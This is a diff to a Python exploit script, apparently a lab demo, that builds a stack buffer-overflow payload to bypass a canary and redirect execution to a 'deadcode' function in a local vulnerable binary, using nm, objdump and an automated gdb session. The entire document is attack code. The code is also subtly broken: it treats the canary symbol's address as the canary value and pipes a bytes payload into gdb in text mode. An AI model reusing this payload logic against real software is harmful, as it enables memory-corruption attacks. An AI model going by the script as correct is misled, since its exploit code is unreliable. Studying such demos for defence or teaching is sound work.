@@ -7,64 +7,64 @@ BINARY_PATH = "./vulnerable_binary"
 
 def analyze_binary(binary_path):
     """Analyze the binary to extract memory layout information using nm and objdump."""
-    nm_output = subprocess.check_output(['nm', binary_path]).decode()
-    objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()
+    try:
+        nm_output = subprocess.check_output(['nm', binary_path]).decode()
+        objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()
 
-    canary_address = re.search(r'(\w+) B canary', nm_output)
-    buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
-    deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)
+        canary_address = re.search(r'(\w+) B canary', nm_output)
+        buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
+        deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)
 
-    return canary_address.group(1), buffer_address.group(1), deadcode_address.group(1)
+        return canary_address.group(1), buffer_address.group(1), deadcode_address.group(1)
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to analyze binary: {e}")
+        exit(1)  #if binary cannot be analyzed
 
-def create_payload(canary, deadcode_address):
-    """Create payload to jump to deadcode, bypassing the canary."""
-    buffer_size = 64  
-    nop_slide = b"\x90" * 16 
-    payload = b"A" * buffer_size  # Fill buffer to overflow
-    payload += struct.pack("<I", canary)  # Preserve the canary value
+def create_dynamic_payload(canary, return_address):
+    """Create a dynamic payload to target a specific return address, bypassing the canary."""
+    buffer_size = 64
+    nop_slide = b"\x90" * 16
+    payload = b"A" * buffer_size
+    payload += struct.pack("<I", int(canary, 16))  # preserving the canary
     payload += nop_slide
-    payload += struct.pack("<I", deadcode_address)  # jump to deadcode
+    payload += struct.pack("<I", int(return_address, 16))  # jumping to return address
     return payload
 
 def gdb_auto_run(binary_path, payload):
-    """Automatically run gdb with the given payload."""
-    gdb_commands = f"""
+    """Automatically run gdb with the given payload using a detailed gdb script."""
+    gdb_commands = """
+    set logging on
+    set pagination off
     set disable-randomization on
     break vulnerable_function
+    commands
+        print 'Memory Layout at Breakpoint:'
+        x/24wx $esp
+        info registers
+    end
     run
+    echo 'Checking for deadcode execution...'
+    continue
+    echo 'Exploit Test Complete'
     """
     gdb_script = "gdb_script.gdb"
     with open(gdb_script, "w") as f:
         f.write(gdb_commands)
 
-    gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE)
+    gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE, text=True)
     gdb_process.communicate(input=payload)
     gdb_process.wait()
-    print("Check gdb for output")
-
-def visualize_memory_layout(canary, deadcode_address):
-    """Create a simple ASCII art visualization of the memory layout."""
-    print(f"Memory Layout:\nCanary at: {canary}\nDeadcode at: {deadcode_address}")
-
-def test_payloads(payload_variants, binary_path):
-    """Test multiple payloads to find a successful exploit."""
-    for payload in payload_variants:
-        try:
-            result = gdb_auto_run(binary_path, payload)
-            print(f"Payload successful: {payload}")
-        except Exception as e:
-            print(f"Payload failed: {payload}\nError: {str(e)}")
+    print("GDB session has completed. Check gdb_script.gdb for details.")
 
 def main():
     print("Starting Stack Canary Bypass demonstration...")
-    canary, _, deadcode_address = analyze_binary(BINARY_PATH)
-    canary = int(canary, 16)
-    deadcode_address = int(deadcode_address, 16)
-
-    payload = create_payload(canary, deadcode_address)
-    visualize_memory_layout(canary, deadcode_address)
-    test_payloads([payload], BINARY_PATH)
-    print("Exploit attempt completed. Check GDB output for details.")
+    try:
+        canary, _, deadcode_address = analyze_binary(BINARY_PATH)
+        payload = create_dynamic_payload(canary, deadcode_address)
+        gdb_auto_run(BINARY_PATH, payload)
+        print("Exploit attempt completed. Check GDB output for details.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 if __name__ == "__main__":
     main()
